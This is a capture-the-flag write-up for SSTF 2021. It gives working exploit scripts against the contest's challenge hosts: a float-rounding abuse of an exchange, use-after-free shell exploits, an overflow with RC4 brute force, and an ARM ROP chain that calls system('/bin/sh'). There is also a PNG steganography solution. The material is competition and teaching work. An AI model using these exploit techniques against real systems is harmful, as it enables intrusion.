# SSTF 2021 Write up - Team Super Guesser

## Exchange

\- increase cash with float rounding  

```python
from urllib.parse import unquote,quote
import base64
import requests

s = requests.session()
r = s.get("http://exchange.sstf.site:7878/register.php")
while(1):
    for i in range(21):
        s.post("http://exchange.sstf.site:7878/order.php",data={"ordertype":"bid","pricetype":"market","amount":"0.1003"})
    r = s.get("http://exchange.sstf.site:7878/trade.php")
    print(r.text)
    r = s.get("http://exchange.sstf.site:7878/claim.php?idx=1")
    print(r.text)
    for i in range(21):
        s.post("http://exchange.sstf.site:7878/order.php",data={"ordertype":"ask","pricetype":"market","amount":"0.1005"})
```

## LostArk 1 ~ 2

### LostArk 1

The binary lets you create different characters (Reaper / Bard / Warlord / Lupeon), which have different "Skills", that can be set and used.

A Lupeon has only one skill `gift`, which will open a shell, but skills for him are "blocked" and cannot be directly executed. 

```c
void Character::useSkill() {
    if (isSkillBlocked()) 
        cout << "blocked" << endl;
    else if (this->Skill) {
        this->Skill();
    }
    else {
        cout << "Set skill first" <<endl;
    }
}
```

Lupeon uses the default implementation of `isSkillIsBlocked` from the base character, which returns `true`, while the other characters override the method and return `false` for it, and execute `Skill`, if it is set.

A character with a set skill will look like this in memory.

```
0x555555570ea0:	0x0000000000000000	0x0000000000000061
0x555555570eb0:	0x000055555555dbf8	0x0000555555570ec8  <= VTable / Name
0x555555570ec0:	0x0000000000000008	0x4141414141414141  <= Name string
0x555555570ed0:	0x0000000000000000	0x0000555555570ee8  <= XXX / Type
0x555555570ee0:	0x0000000000000006	0x0000726570616552  <= Type string
0x555555570ef0:	0x0000000000000000	0x00005555555574f0  <= XXX / Active Skill
0x555555570f00:	0x0000000000000000	0x0000000000000021
```

So, for the first LostArk, it's pretty simple to execute the Lupeons special skill 

- Create a lupeon (lupeon `ctor` will set active skill to `gift`) 
-  Delete lupeon (character chunk will get freed) 
-  Create any other character (since character creation doesn't initialize active skill, it will still point to Lupeons gift) 
-  Select character 
-  Use skill

```python
from pwn import *
import sys

LOCAL = True

HOST = "lostark.sstf.site"
PORT = 1337
PROCESS = "./L0stArk"

def create(type, name):
	r.sendline("1")
	r.sendlineafter(": ", str(type))

	if type != 7:
		r.sendlineafter(": ", name)

	r.recvuntil("pick: ")

def choose(idx):
	r.sendline("4")
	r.sendlineafter(": ", str(idx))
	r.recvuntil("pick: ")

def delete(idx):
	r.sendline("2")
	r.sendlineafter(": ", str(idx))
	r.recvuntil("pick: ")

def useskill():
	r.sendline("6")

def exploit(r):
	create(7, "")
	delete(0)
	create(1, "AAAA")
	choose(0)
	useskill()
	
	r.interactive()
	
	return

if __name__ == "__main__":
	# e = ELF("./L0stArk")

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)		
	else:
		LOCAL = True
		r = process("./L0stArk")
		print (util.proc.pidof(r))
		pause()
	
	exploit(r)
```

```
$ python xpl.py 1
[+] Opening connection to lostark.sstf.site on port 1337: Done
[*] Switching to interactive mode

= use skill =
$ id
uid=1000(lostark) gid=1000(lostark) groups=1000(lostark)
$ cat /flag
SCTF{Wh3r3 1s 4 Dt0r?}
```

### LostArk 2

In LostArk 2 a `dtor` was added for each character, in which the active skill for the character will be reset before the object gets freed. 

```c
void Lupeon::~Lupeon(Character *this)
{  
  this->ActiveSkill = 0;
  Character::~Character(this);
}
```

This kills the simple reallocation solution from part 1. But, there's a new bug in the `pickChar` method. 

```c
void pickChar(void)
{
  unsigned int idx = 0;  

  cout<<endl<<"== choose =="<<endl;
  
  ... 
      
  Character* char = CHARACTERS[idx];

  picked_c.reset(char);
}
```

The `reset` function will "destroy the object and takes ownership of it". Calling this, will `free` the object, without calling the `dtor` of it. Exactly what we need.

So the plan for this changes to 

- Create a lupeon 
- Create random char
- Choose lupeon character (sets active skill to `gift`) 
- Choose random char (this frees the lupeon character without calling dtor) 
- Create another char (this will be placed in the just freed lupeon) 
- Choose the newly created char 
- Use skill to trigger `gift`

```python
def exploit(r):
	create(7, "")           # create lupeon
	create(1, "A"*(0x60))   # create random char
		
	choose(0)               # choose lupeon
	choose(1)               # frees picked char (not calling dtor)

	create(1, "A"*(0x40))	
	choose(0)
	r.sendline("6")         # use skill (will be lupeon skill)
	
	r.interactive()
	
	return
```

```
$ python xpl.py 1
[+] Opening connection to lostark2.sstf.site on port 1337: Done
[*] Switching to interactive mode

= use skill =
$ cat /flag
SCTF{KUKURUPPINGPPONG!}
```

## authcode

1. strncat overrun by one byte (null) if strlen(src) >= n --> overwrite key's least significant byte to null. 
2. Set team size to -7~-2 --> RC4 key size: 9~14 
3. Input PIN code -1 (result in 0xffffffff) 
4. Recover system address byte by byte with BF 
5. Teardown

```python
#!/usr/bin/env python3

from pwn import *

context(arch='amd64', aslr=False, log_level='debug', terminal='tmux split -h'.split())
p = remote("authcode.sstf.site", 1337)
#p = process(["stdbuf", "-o0", "./authcode"])

def set_name(data):
    p.sendlineafter(" > ", "1")
    p.sendlineafter(" > ", data)

def set_size(data):
    p.sendlineafter(" > ", "2")
    p.sendlineafter(" > ", data)

def authcode(data):
    p.sendlineafter(" > ", "3")
    p.sendlineafter(" > ", data)


e = ELF("./authcode")


name = b"A"*0x1c
set_name(name)

key = b"\xff"*4 + b"\x03\0\0\0" # + system_addr
pt = b"AAAA\xff\xff\xff\xff"

from Crypto.Cipher import ARC4
for i in range(6):
    set_size(str(-7 + i))
    # one byte null overflow
    authcode("-1")
    ct = bytes.fromhex(p.recvline().split(b": ")[1].decode())

    for j in range(0x100):
        res = ARC4.new(key + bytes((j,))).encrypt(pt)
        if res == ct:
            key += bytes((j,))
            break
    else:
        raise Exception('nono')

key += b'\0\0'

system = u64(key[8:])

set_name("A"*(0x130 - 0xe0) + "root\0")
p.sendlineafter(" > ", "4")
p.sendlineafter("?\n", str(system))

context.log_level = 'info'
p.interactive()
```

## mars over

All the last byte of checksums of `IDAT` chunks are printable.

Concat these and print, we can get the ascii art including the flag. 

```python
with open('MarsRover.png','rb') as f:
    data = f.read()

i = 0
out = b''
try:
    while x:=data.index(b"IDAT",i):
        prev_check_sum = data[x-8:x-4]
        length = int.from_bytes(data[x-4:x],'big')
        i = x + 4
        # print(hex(length))
        out += prev_check_sum[-1:]
except:
    pass

print(out[1:].decode())
```

```
❯ python parse.py
                                   'lOKXKOo,
                                 ,XMMMMMMMMWXl
        .,;'.                    0MMMWWKOkxOXXc
     .xXWMMMMXo.                .::;c0:.... 'o,                       .:x0KNNKx,
     kOkcOWMMMWX.                ..,'XO.'.. ;c.                      ;WMMMMMMWWN0,
     ....cc::ckxc                ...ckk0c.  ..                      dWWXWWW0o.. :l
     .........dO.                 .,:'.ld:....                      .'oc;::c:
      .'..'..l0l,                 .........,,                      .'Oc..'..
       ',,,,',,..                   ',,'',:,.                      .o::......  ..
       ',,,,,...                    .',,,','.. ..                  .'.........
   .,....''''                      ..',',,,...'XMWXko,              ''.......
.dNMMWO;.'.'.';xx;           ;xk...'',,.',,..'dMMMMMMWX;             ,;;,,,..
oKXXNXx:''....''kKd         kNN0'''''''..'''..ONKkdol:,:.       .:oONO;,';;'.......;;
',:cc::;'',;c,..xOl        .:coc,''''''...''.'K0o,......       dNWMMO,''.,''......'0WX:
.';cd''d;',l0Oc;0N;        .;;,,..',,,,'..'''lWN0; .''..      .odo:l,'''.'''......';;,,;
.'d0d.dkxlox0XKcckl         ;;,'.',;;::;,,;;:0Kk:   ',..      .;;,,l,,,'..''......'''..
.l0Kd';;,;:cll:,::d.        ;;;,.',,;;::,,:;cd,. .  .,'.      .;:,.,;::;,;;,''..  .''...
,odkc',,,;;;;c:;::d.        ;:;,.;;,;clc,,::;c:...   ,,.      'c:;c;;;:c;::;,...   .,'...
;kd:..'',;::cc:,::o:       .;c,'.';;ccc:;;cc:;'...   .,'.    .lc;',;:ll:;:c:,....   .,..
oWWk.lxkxxkl:c:,;:ok'      .::,. .;;;clc:;:c:;....    ',. .  ;lc,..ccolc:cc:;'...    ''.
'KWKxNWNKOxdcccoc;kKO      .,,.   ,;:lll:;:cc:,...    .'..lcoKx,.  :clol:clc;....     ',.';
.cKNOkOOOKxlooodc;OXX.    kx:    .,,;cll:;;c::,'..    ....O0MMWc   ,;cll:;cc:'...     .'.lX
.:OXOxkko;:::::;;,cOX:   kMMMo   '                                        c::,...     ..'lO
 'oXKlcl:''',,;;,',dKx  ,MMMWk    SCTF{M4rti@n_wi11_b3_bACk_aT_anY_t1M3}  :;,'...      ''kk
  cKKo::,''.'',,'.clXX. kMMWO'                                            :;,'....     ';O'
  .dXxc:;.'.''''''lcNNdOMMMX.       ..;cc:;::::;,';'.'WWW0.OX.  .c',,,;cc;::,,'.'..   .dK0.
  ,kKXkxo','....'':.XNMMMXWMx       ...';:;::;;,'''..OMWNK.c.    ''.'',;;;;;,'.....   lWXx
  .,xKK0l;;'.''''',;KNMN:.xM0  ..    ...',,;,,,''..;KMMWWK      co,''''',,,,,''....  .NMNO.
   .dxo;dl,.''.'',.00XMx  ;WX  ''..   ..''''''''..oNWMMWNN;     KK;.''.,,',,'''.....;NMMNK.
    .;:''o:.....''cWK0K.  .Kx .'''......''',''',';WKkWW0cO;    ,XO,',.....'...,'...:WWMMNN:
     ..;,''......';No,k:   '. .'''','..........,,0XdONX:cO.    c0k,,..........,....0xdWXl;.
    . ..c'  .....  oO,ck;     .','''........'..':XxxONx.Oc     oko,,.. ..  ...,'..c0.;0d..
    ....;:  .....   .l,.;'    '',''..  ..   ...,:koldl,.O.     oxc''.       ..,'..l' :o.
    ....    .....            ..''''..       ...,;cco, ...      ;l''..       ..'.... .,
```

## armarm

1. `sprintf` instead of `snprintf` --> buffer overflow (ROP) 
2. Phase 1: leak libc address using gadget in print_menu 
3. Phase 2: call system("/bin/sh")

```python
#!/usr/bin/env python3

from pwn import *


context(arch='arm', aslr=False, log_level='debug', terminal='tmux split -h'.split())
#p = process(["qemu-arm-static", "-L", "/usr/arm-linux-gnueabihf/", "-g", "31337", "./prob"])
p = remote("armarm.sstf.site", 31338)

def join(id, pw):
    p.sendlineafter(">>", "1")
    p.sendlineafter(": ", id)
    p.sendlineafter(": ", pw)


def login(id, pw):
    p.sendlineafter(">>", "2")
    p.sendlineafter(": ", id)
    p.sendlineafter(": ", pw)


def savenote(data, raw=False):
    p.sendlineafter(">>", "4")
    if raw:
        p.sendlineafter(": ", data)
    elif isinstance(data, bytes):
        p.sendlineafter(": ", b"note://" + data)
    else:
        p.sendlineafter(": ", "note://" + data)


e = ELF("./prob")
main = 0x011D24C4+1

putsmagic = 0x011D215E+1    # mov r0, r3 ; blx puts ; nop ; pop {r7, pc}
magic = 0x011d27f4 # pop {r1, r2, r4, r5, r6, r7, r8, ip, lr, pc}
magic2 = 0x011D27F6+1 # pop.w {r3-r9, pc}
pop3 = 0x011d28cc     # pop {r3, pc}
pop4 = 0x011d20ba+1     # pop {r4, pc}
pop7 = 0x11d2119        # pop {r7, pc}
# mov r0, r7 ; blx r3
blr = 0x011d27ef

sR = 0x011D2934 # "r\0"

# Phase 1: Leak libc address
username = p32(pop3) + p32(e.got['printf']) + p32(putsmagic) + p32(0xcafebabe)
username += p32(main)
username = username.ljust(90 - 6, b"A")
username += b"/bin/sh"
join(username, 'b')
login(username, 'b')

payload = b"note://".ljust(0x8, b'A')
payload += b"DDDD"
payload += p32(pop3) + p32(e.got['puts']) + p32(putsmagic) + p32(0xcafebabe)

savenote(payload, True)

p.recvline()
puts_addr = u32(p.recvline()[:4])
printf_addr = u32(p.recvline()[:4])

system_addr = printf_addr - 0x0381f5 + 0x02d4cd

# Phase 2: system("/bin/sh")
username = b''
username = p32(pop3) + p32(e.got['printf']) + p32(putsmagic) + p32(0xcafebabe)
username += p32(main)
username = username.ljust(90 - 6, b"A")
username += b"/bin/sh"
join(username, 'b')
login(username, 'b')

binsh_addr = 0x011E3150 + 90 - 6

payload = b"note://".ljust(0x8, b'A')
payload += p32(binsh_addr)
payload += p32(pop3) + p32(system_addr) + p32(blr) + p32(0xcafebabe)

savenote(payload, True)

context.log_level = 'info'
p.interactive()
```

## cyberpunk

```
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣿⣿⠿⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⣀⣀⡀⠀⣠⣾⡿⠋⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⡄⠀⠀⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡄⠀⠀⠀⢀⣀⣤⡶⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣾⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢀⣤⣾⡿⠋⢀⣴⣿⠛⠛⠛⢻⣿⣿⢧⣴⣿⠛⠛⠛⠀⠀⠀⠀⣸⡿⠉⠉⠉⠉⠉⠉⣉⣹⣿⣿⡿⠧⠀⠀⢠⣿⡟⠛⠛⠛⠛⠛⠛⠉⣉⣭⣿⡿⠟⠃⠀⣠⡾⠃⢠⣾⡄⠀⠀⠀⣾⡟⠀⣠⣿⡟⠀⣠⣤⡶⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣀⣠⣄⣍⣉⣉⣁⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣴⣿⣦⡀⠙⠷⠶⣟⣛⠛⠀⣐⣛⠛⠁⢀⣀⣚⠛⠋⢁⠺⠿⠟⠛⠛⠛⠉⠁⠀⣠⣿⣷⣤⣤⣶⣾⠿⠟⠛⠉⠁⠀⠀⠀⠀⣠⣿⠿⠀⣀⣀⣤⣴⡾⠿⠛⢉⣩⠀⠀⠀⢀⣴⡿⠃⢠⣿⣿⣿⠀⢀⣾⠏⠀⣀⣉⡹⡻⣿⣯⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠐⠛⢿⣿⣿⣿⠾⠿⠿⠿⠿⠿⠿⠿⠖⠓⠛⠛⠛⠛⠛⠛⠉⠉⠉⠀⠀⣀⣘⠟⠃⠠⠾⡟⢃⠤⠶⠿⠋⠁⠀⠐⠁⠀⣠⢤⡴⢆⡐⠶⠀⢠⣿⠛⠙⠛⢿⣿⣿⣖⣦⣄⣀⠀⠀⢀⣤⣶⣿⣿⠿⠟⠋⠉⠉⠀⠀⠀⢠⣻⠃⠀⣀⣶⣾⡿⠀⣐⣛⠋⠀⣻⣶⣾⠛⠀⢸⣿⠏⠀⠈⠛⠻⣿⠗⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠋⠀⠼⠿⠿⠛⠉⠉⠁⠀⠀⠀⠀⠙⠛⠉⠀⠀⠀⠀⠀⠀⣠⣿⠏⠀⠀⠀⠀⠀⠉⠛⠛⠿⢿⣿⠗⠀⢸⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠔⠋⠀⡛⡟⠀⠐⠛⠃⠀⠀⠘⠛⠃⠀⠀⠤⠋⠀⠀⠀⠀⠀⠀⠈⠒⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⠋⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠒⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                       Cyberpunk 2021 Breach Protocol v.1.3
                                                        Q - Quit                H,? - Help
                                                        W - Up                    D - Right
                                                        S - Down                  A - Left
                                                  <Space> - Select          <Enter> - Continue
                                                         You have 90 seconds to break in


⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣿⣿⠿⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⣀⣀⡀⠀⣠⣾⡿⠋⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⡄⠀⠀⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡄⠀⠀⠀⢀⣀⣤⡶⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣾⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢀⣤⣾⡿⠋⢀⣴⣿⠛⠛⠛⢻⣿⣿⢧⣴⣿⠛⠛⠛⠀⠀⠀⠀⣸⡿⠉⠉⠉⠉⠉⠉⣉⣹⣿⣿⡿⠧⠀⠀⢠⣿⡟⠛⠛⠛⠛⠛⠛⠉⣉⣭⣿⡿⠟⠃⠀⣠⡾⠃⢠⣾⡄⠀⠀⠀⣾⡟⠀⣠⣿⡟⠀⣠⣤⡶⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣀⣠⣄⣍⣉⣉⣁⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣴⣿⣦⡀⠙⠷⠶⣟⣛⠛⠀⣐⣛⠛⠁⢀⣀⣚⠛⠋⢁⠺⠿⠟⠛⠛⠛⠉⠁⠀⣠⣿⣷⣤⣤⣶⣾⠿⠟⠛⠉⠁⠀⠀⠀⠀⣠⣿⠿⠀⣀⣀⣤⣴⡾⠿⠛⢉⣩⠀⠀⠀⢀⣴⡿⠃⢠⣿⣿⣿⠀⢀⣾⠏⠀⣀⣉⡹⡻⣿⣯⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠐⠛⢿⣿⣿⣿⠾⠿⠿⠿⠿⠿⠿⠿⠖⠓⠛⠛⠛⠛⠛⠛⠉⠉⠉⠀⠀⣀⣘⠟⠃⠠⠾⡟⢃⠤⠶⠿⠋⠁⠀⠐⠁⠀⣠⢤⡴⢆⡐⠶⠀⢠⣿⠛⠙⠛⢿⣿⣿⣖⣦⣄⣀⠀⠀⢀⣤⣶⣿⣿⠿⠟⠋⠉⠉⠀⠀⠀⢠⣻⠃⠀⣀⣶⣾⡿⠀⣐⣛⠋⠀⣻⣶⣾⠛⠀⢸⣿⠏⠀⠈⠛⠻⣿⠗⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠋⠀⠼⠿⠿⠛⠉⠉⠁⠀⠀⠀⠀⠙⠛⠉⠀⠀⠀⠀⠀⠀⣠⣿⠏⠀⠀⠀⠀⠀⠉⠛⠛⠿⢿⣿⠗⠀⢸⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠔⠋⠀⡛⡟⠀⠐⠛⠃⠀⠀⠘⠛⠃⠀⠀⠤⠋⠀⠀⠀⠀⠀⠀⠈⠒⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⠋⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠒⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                               [ 00  00  00  00  00  00  00  00 ]
                                                 ┌───┐                         
                                                 ┤#56├──08───56───3D───E0───E0─
                                                 └───┘                         
                                                                               
                                                   BB   DF   2B   3D   56   B4 
                                                                               
                                                                               
                                                   1D   08   08   08   E0   B4 
                                                                               
                                                                               
